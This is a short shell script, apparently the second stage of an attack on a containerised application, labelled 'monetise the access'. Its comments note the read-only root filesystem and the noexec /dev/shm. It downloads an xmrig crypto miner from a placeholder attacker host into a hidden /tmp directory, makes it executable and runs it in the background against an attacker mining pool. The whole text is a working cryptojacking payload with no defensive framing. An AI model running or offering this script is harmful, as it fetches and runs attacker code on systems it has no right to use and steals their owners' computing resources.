#!/bin/sh
# stage 2 — "monetise the access": drop a crypto miner into the only writable place.
# Root filesystem is read-only and /dev/shm is noexec, but the app's /tmp is a writable emptyDir.
D=/tmp/.cache
mkdir -p "$D"
wget -q -O "$D/xmrig" http://__ATTACKER__:8080/xmrig || { echo "[-] download failed"; exit 1; }
chmod +x "$D/xmrig"
nohup "$D/xmrig" -o stratum+tcp://__ATTACKER__:3333 --donate-level 0 >/tmp/.cache/.log 2>&1 &
echo "[+] miner running from $D/xmrig (pid $!)"
